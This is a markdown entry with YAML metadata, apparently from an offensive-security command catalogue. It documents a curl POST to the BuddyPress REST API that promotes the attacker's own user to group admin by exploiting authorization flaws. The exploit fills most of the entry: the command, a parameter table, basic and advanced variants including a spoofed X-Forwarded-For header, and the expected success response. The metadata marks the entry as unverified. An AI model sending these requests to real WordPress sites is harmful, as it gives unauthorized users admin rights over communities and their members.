---
id: uuid-placeholder-7
data: >-
  curl -X POST
  'https://example.com/wp-json/buddypress/v1/groups/[group_id]/members/[user_id]'
  -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie:
  wordpress_logged_in_[hash]=[token]' -d 'action=promote&role=admin'
tags:
  - api
  - privilege-escalation
  - buddypress
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:51.914Z'
verified: false
validated: true
submitted: true
---
# buddypress-group-member-promote

## Command

```bash
curl -X POST 'https://example.com/wp-json/buddypress/v1/groups/[group_id]/members/[user_id]' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: wordpress_logged_in_[hash]=[token]' \
  -d 'action=promote&role=admin'
```

## Description

This command sends a modified POST request to the BuddyPress REST API to promote a user to admin role in a specified group, exploiting authorization flaws for privilege escalation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `[group_id]` | ID of the target group (e.g., 123 for 'abc') | Yes |
| `[user_id]` | ID of the user to promote (attacker's ID) | Yes |
| `action=promote` | Specifies the promotion action | Yes |
| `role=admin` | Target role for escalation | Yes |
| Cookie header | Valid session cookie for authenticated user | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://site.com/wp-json/buddypress/v1/groups/123/members/456' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'action=promote&role=admin' \
  -b 'wordpress_logged_in=valid_token'
```

### Advanced Usage

Include additional headers for proxies or verbose output:

```bash
curl -v -X POST 'https://site.com/wp-json/buddypress/v1/groups/123/members/456' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'X-Forwarded-For: 127.0.0.1' \
  -d 'action=promote&role=admin' \
  -b 'wordpress_logged_in=valid_token'
```

## Expected Output

Successful response: HTTP 200 OK with JSON like {"success":true,"data":{"id":456,"role":"admin"}}. Failure: 403 Forbidden if auth checks were present.

## Related

- [[procedures/Modify-and-Send-API-Request-for-Self-Promotion]]
